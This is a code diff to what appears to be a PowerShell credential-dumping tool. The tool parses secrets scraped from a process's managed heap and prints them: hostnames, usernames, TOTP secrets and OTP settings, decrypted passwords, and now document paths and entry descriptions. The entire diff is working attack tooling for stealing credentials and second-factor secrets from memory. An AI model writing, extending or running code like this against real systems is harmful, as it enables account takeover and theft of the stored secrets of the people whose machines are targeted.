@@ -916,6 +916,7 @@ class Program
 
     $inResults = $false
     $credentials = @()
+    $docPaths = @()
 
     foreach ($line in $output) {
         $s = "$line"
@@ -924,18 +925,25 @@ class Program
         if ($s -eq '##RESULTS_START##') { $inResults = $true; continue }
         if ($s -eq '##RESULTS_END##') { $inResults = $false; continue }
 
-        if ($inResults -and $s -match '^TYPE:(.+?)\|NAME:(.*?)\|HOST:(.*?)\|USER:(.*?)\|TOTP:(.*?)\|OTPALGO:(.*?)\|OTPDIGITS:(.*?)\|OTPPERIOD:(.*?)\|OTPLABEL:(.*?)\|PASS:(.*)$') {
+        if ($inResults -and $s -match '^DOCPATH:(.+?)=(.+)$') {
+            $docPaths += [PSCustomObject]@{ Name = $Matches[1]; Path = $Matches[2] }
+        }
+        elseif ($inResults -and $s -match '^TYPE:(.+?)\|NAME:(.*?)\|HOST:(.*?)\|USER:(.*?)\|TOTP:(.*?)\|OTPALGO:(.*?)\|OTPDIGITS:(.*?)\|OTPPERIOD:(.*?)\|OTPLABEL:(.*?)\|PASS:(.*)$') {
+            $desc = ""
+            if ($s -match '\|DESC:(.*)$') { $desc = $Matches[1] }
+            $null = $s -match '^TYPE:(.+?)\|NAME:(.*?)\|HOST:(.*?)\|USER:(.*?)\|TOTP:(.*?)\|OTPALGO:(.*?)\|OTPDIGITS:(.*?)\|OTPPERIOD:(.*?)\|OTPLABEL:(.*?)\|PASS:([^|]*)'
             $credentials += [PSCustomObject]@{
-                Type      = $Matches[1]
-                Name      = $Matches[2]
-                Host      = $Matches[3]
-                Username  = $Matches[4]
-                TOTP      = $Matches[5]
-                OtpAlgo   = $Matches[6]
-                OtpDigits = $Matches[7]
-                OtpPeriod = $Matches[8]
-                OtpLabel  = $Matches[9]
-                Password  = $Matches[10]
+                Type        = $Matches[1]
+                Name        = $Matches[2]
+                Host        = $Matches[3]
+                Username    = $Matches[4]
+                TOTP        = $Matches[5]
+                OtpAlgo     = $Matches[6]
+                OtpDigits   = $Matches[7]
+                OtpPeriod   = $Matches[8]
+                OtpLabel    = $Matches[9]
+                Password    = $Matches[10]
+                Description = $desc
             }
         }
     }
@@ -943,6 +951,13 @@ class Program
     Write-Host "`n============================================" -ForegroundColor Yellow
     Write-Host "  CREDENTIALS EXTRACTED (memory)" -ForegroundColor Yellow
     Write-Host "============================================" -ForegroundColor Yellow
+
+    if ($docPaths.Count -gt 0) {
+        Write-Host "`n  Documents:" -ForegroundColor DarkCyan
+        foreach ($dp in $docPaths) {
+            Write-Host "    $($dp.Name) => $($dp.Path)" -ForegroundColor DarkCyan
+        }
+    }
 
     if ($credentials.Count -eq 0) {
         Write-Host "`n  [-] No credentials found on the managed heap." -ForegroundColor DarkYellow
@@ -955,11 +970,14 @@ class Program
             $i++
             $label = if ($e.Name) { "$($e.Name) ($($e.Type))" } else { $e.Type }
             Write-Host "`n  [$i] $label" -ForegroundColor Cyan
-            if ($e.Host)     { Write-Host "      Host: $($e.Host)" -ForegroundColor White }
-            if ($e.Username) { Write-Host "      User: $($e.Username)" -ForegroundColor White }
+            if ($e.Host)        { Write-Host "      Host: $($e.Host)" -ForegroundColor White }
+            if ($e.Username)    { Write-Host "      User: $($e.Username)" -ForegroundColor White }
+            if ($e.Description) { Write-Host "      Desc: $($e.Description)" -ForegroundColor DarkGray }
             if ($e.Password) {
                 Write-Host "      Pass: $($e.Password)" -ForegroundColor Red
                 $decrypted++
+            } elseif ($e.Type -match 'Connection') {
+                Write-Host "      Pass: (via credential reference)" -ForegroundColor DarkGray
             } else {
                 Write-Host "      Pass: (decryption failed)" -ForegroundColor DarkYellow
             }
